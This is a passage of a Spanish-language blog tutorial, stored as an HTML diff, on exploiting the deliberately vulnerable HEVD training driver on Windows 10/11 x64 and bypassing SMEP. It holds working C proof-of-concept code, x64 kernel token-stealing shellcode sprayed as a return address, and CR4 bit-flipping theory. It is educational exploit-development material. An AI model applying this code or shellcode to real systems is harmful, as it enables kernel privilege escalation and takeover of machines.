@@ -1,0 +1,661 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x01 - Matándo Windows Kernel Mitigaciones // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x01 - Matándo Windows Kernel Mitigaciones">
+  <meta name="twitter:description" content="Esto fue posible por trabajo duro y determinación. No te sientas frustrado si estas cosas no las entiendes inmediatamente, y recordarte la fuente de la verdad siempre será el código. Y, para nosotros, el código es assembly crudo. Es importante que entiendas estas técnicas porque cuando Microsoft saca nuevas mitigaciones tu fundación te permitirá desarrollar evasiones. Entonces, si algo no está claro, tóma tu tiempo y revísalo con WinDbg.
+En el último artículo deberías haber obtenido un entendimiento sólido de los fundamentos de Windows Kernel Explotación.">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x01-mat%C3%A1ndo-windows-kernel-mitigaciones/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x01 - Matándo Windows Kernel Mitigaciones">
+  <meta property="og:description" content="Esto fue posible por trabajo duro y determinación. No te sientas frustrado si estas cosas no las entiendes inmediatamente, y recordarte la fuente de la verdad siempre será el código. Y, para nosotros, el código es assembly crudo. Es importante que entiendas estas técnicas porque cuando Microsoft saca nuevas mitigaciones tu fundación te permitirá desarrollar evasiones. Entonces, si algo no está claro, tóma tu tiempo y revísalo con WinDbg.
+En el último artículo deberías haber obtenido un entendimiento sólido de los fundamentos de Windows Kernel Explotación.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-12-08T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-12-08T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x01 - Matándo Windows Kernel Mitigaciones</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Dec 8, 2024
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          17 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Esto fue posible por trabajo duro y determinación. No te sientas frustrado si estas cosas no las entiendes inmediatamente, y recordarte la fuente de la verdad siempre será el código. Y, para nosotros, el código es assembly crudo. Es importante que entiendas estas técnicas porque cuando Microsoft saca nuevas mitigaciones tu fundación te permitirá desarrollar evasiones. Entonces, si algo no está claro, tóma tu tiempo y revísalo con WinDbg.</p>
+<p>En el <a href="https://wetw0rk.github.io/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">último artículo</a> deberías haber obtenido un entendimiento sólido de los fundamentos de Windows Kernel Explotación. Ahora saltaremos al abismo y explotaremos Windows 10 (x64) y Windows 11 (x64). Dentro de este artículo encontrarás una introducción, a algunos de los últimos mitigaciones implementado por Microsoft y verás con qué &ldquo;facilidad&rdquo; los venceremos. Con eso dicho solo ALGUNOS serán cubierto, existen más, pero solo los cubriremos cuando sean relevantes.</p>
+<p>Además, esta publicación incluye mi cadena de ROP - <em>Violet Phosphorus</em>, un método universal para evadir VBS/SMEP. Que yo sepa, no he visto esta técnica implementada por otros artículos. Con esto dicho, lo clamo como mi técnica,</p>
+<p>Para demostrar lo efectivo que es, seguí adelante y lo probé contra el nuevo versión de Windows - Windows 11 24H2 solo por esta publicación.</p>
+<pre tabindex="0"><code>DESCARGO DE RESPONSABILIDAD: PARA QUEDAR CLARO ESTA TÉCNICA NO FUE HECHO PARA EVITAR HVCI
+</code></pre><h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#entrando-al-mundo-moderno">Entrando al Mundo Moderno</a>
+<ul>
+<li><a href="#eludiendo-smep-teor%C3%ADa">Eludiendo SMEP (Teoría)</a>
+<ul>
+<li><a href="#encontrar-gadgets-y-como-usarlos">Encontrar &ldquo;Gadgets&rdquo; y Como Usarlos</a></li>
+<li><a href="#encontrar-la-direcci%C3%B3n-base-de-el-kernel">Encontrar la dirección base de el Kernel</a></li>
+</ul>
+</li>
+<li><a href="#evadiendo-vbs-teor%C3%ADa">Evadiendo VBS (Teoría)</a></li>
+</ul>
+</li>
+<li><a href="#violet-phosphorus">Violet Phosphorus</a>
+<ul>
+<li><a href="#entendiendo-la-cadena-de-rop">Entendiendo la Cadena de &ldquo;ROP&rdquo;</a></li>
+</ul>
+</li>
+<li><a href="#creando-una-prueba-de-concepto-poc">Creando una Prueba de Concepto (POC)</a></li>
+<li><a href="#explotaci%C3%B3n-rip--tear">Explotación (Rip &amp; Tear)</a></li>
+<li><a href="#recursos">Recursos</a></li>
+</ul>
+<h1 id="entrando-al-mundo-moderno">Entrando al Mundo Moderno</h1>
+<p>Teniendo en cuenta que explotamos un &ldquo;Stack Overflow&rdquo; dentro de <code>Windows 7 (x86)</code> y hemos cubierto sus operaciones. No había necesidad de repetir el análisis del la vulnerabilidad, al menos no para este tipo de vulnerabilidad. Con esto dicho, podemos seguir adelante y saltar a desarrollando un versión para Windows 10 (x64).</p>
+<p>Como fue mencionado en el <a href="https://wetw0rk.github.io/posts/0x00-introducci%C3%B3n-a-windows-kernel-explotaci%C3%B3n/">último artículo</a> cambiaremos el lenguaje de programación a C en lugar de Python. Si estás usando Kali y quieres seguir conmigo, instalar <em>mingw-w64</em>. Esto será lo que usaré para compilar mi código. También puedes usar <a href="https://visualstudio.microsoft.com/">Visual Studio</a> en realidad todo es preferencia.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install mingw-w64 -y
+</span></span></code></pre></div><p>Si todavía estás aprendiendo C, y lo prefieres, todo se puede lograr en Python. Yo intencionalmente escribí el código del último artículo en Python para que sirva como ejemplo para aquellos que no quieran usar C.</p>
+<p>Sin embargo, pronto verás que cuanto más de dentres a explotación, más se necesita conocimiento de C.</p>
+<p>Esto no es opcional.</p>
+<p>Empecemos mirando el &ldquo;exploit&rdquo; inicial:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 4242
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE hHEVD                <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD bytesReturned         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[BUFFER_SIZE]    <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Getting a handle on HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                        (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                        NULL,
+</span></span><span style="display:flex;"><span>                        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                        NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Generating evil buffer...&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buffer, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">3000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x222003</span>,
+</span></span><span style="display:flex;"><span>                    buffer,
+</span></span><span style="display:flex;"><span>                    BUFFER_SIZE,
+</span></span><span style="display:flex;"><span>                    NULL,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                    NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Lo podemos compilar usando un compilador cruzado dentro de mingw sobre Linux (<em>x86_64-w64-mingw32-gcc poc.c -o poc.exe</em>). Una vez enviado, podremos ver que hemos obtenido corrupción de la memoria :)</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/corruption.png" alt="alt text"></p>
+<p>Cambiemos este código, esta vez incluiremos shellcode (Generado con <a href="https://github.com/wetw0rk/Sickle">Sickle</a>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 4242
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    LPVOID lpMemory <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> shellcodeLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> buffer[BUFFER_SIZE] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// mov rcx, rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\x04</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// mov dl, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0x448]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x2d\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// sub rax, 0x448
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// cmp byte ptr [rax + 0x440], dl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xeb</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// jne 0x1017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x4b8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\x91\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov qword ptr [rcx + 0x4b8], rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5d</span><span style="color:#e6db74">&#34;</span>          <span style="color:#75715e">// pop rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc2\x08\x00</span><span style="color:#e6db74">&#34;</span>; <span style="color:#75715e">// ret 8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Getting a handle on HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                        (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                        NULL,
+</span></span><span style="display:flex;"><span>                        OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                        FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                        NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    lpMemory <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                            shellcodeLength,
+</span></span><span style="display:flex;"><span>                            (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                            PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Copying shellcode into RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(lpMemory, shellcode, shellcodeLength);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Spraying return address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpMemory);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">270</span>; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Spray the return address, who cares about accuracy ;) */</span>
+</span></span><span style="display:flex;"><span>        buffer[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)lpMemory;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x222003</span>,
+</span></span><span style="display:flex;"><span>                    buffer,
+</span></span><span style="display:flex;"><span>                    BUFFER_SIZE,
+</span></span><span style="display:flex;"><span>                    NULL,
+</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                    NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Intentemos reservar memoria como lo hicimos antes en <code>Windows 7 (x86)</code>. Cuando saltamos a la memoria, obtenemos este error:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/attempt_failed_exec_userland_code.png" alt="alt text"></p>
+<p>Después de investigar un poco el error, podemos confirmar que estamos lidiando con <strong>SMEP (Prevención de Ejecución dentro de la Supervisora / Supervisor Mode Execution Prevention)</strong> que es una protección de memoria integrada dentro de sistemas de Windows desde Windows 8. Suponiendo que estas familiarizado con la explotación de &ldquo;user-land&rdquo; imagínete esto como DEP, solo que impide la ejecución dentro de procesos de &ldquo;user-land&rdquo;. En breve, SMEP esta configurando en el bit veinte del el registro CR4. Esto lo he simplificado demasiado, pero para este artículo no necesitamos saber más. Lo unico que tenemos que hacer es evadirlo, este es nuestro objetivo.</p>
+<h2 id="eludiendo-smep-teoría">Eludiendo SMEP (Teoría)</h2>
+<p>En teoría, esto puede ser modificado por el Kernel, por eso ROP es un camino ideal para este problema.</p>
+<p>Veamos esto en WinDbg.</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/cr4.png" alt="alt text"></p>
+<p>Al voltear el bit de cualquier número, esencialmente estamos cambiando el valor. Para ver qué número necesitaríamos aquí, escribí un programa simple en C para generar el número para mí. El código para hacer esto se puede ver aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* wetw0rk */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://stackoverflow.com/questions/111928/is-there-a-printf-converter-to-print-in-binary-format
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT8 &#34;%c%c%c%c%c%c%c%c &#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT8(i)    \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x80ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x40ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x20ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x10ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x08ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x04ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x02ll) ? &#39;1&#39; : &#39;0&#39;), \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x01ll) ? &#39;1&#39; : &#39;0&#39;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT16 \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BINARY_PATTERN_INT8              PRINTF_BINARY_PATTERN_INT8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT16(i) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BYTE_TO_BINARY_INT8((i) &gt;&gt; 8),   PRINTF_BYTE_TO_BINARY_INT8(i)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT32 \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BINARY_PATTERN_INT16             PRINTF_BINARY_PATTERN_INT16
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT32(i) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BYTE_TO_BINARY_INT16((i) &gt;&gt; 16), PRINTF_BYTE_TO_BINARY_INT16(i)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT64    \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BINARY_PATTERN_INT32             PRINTF_BINARY_PATTERN_INT32
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT64(i) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BYTE_TO_BINARY_INT32((i) &gt;&gt; 32), PRINTF_BYTE_TO_BINARY_INT32(i)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * flip_bit: simple function to flip a bit, for CR4 this would be 20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">flip_bit</span>(<span style="color:#66d9ef">uint64_t</span> cr4, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> bit_position)
+</span></span><span style="display:flex;"><span>{
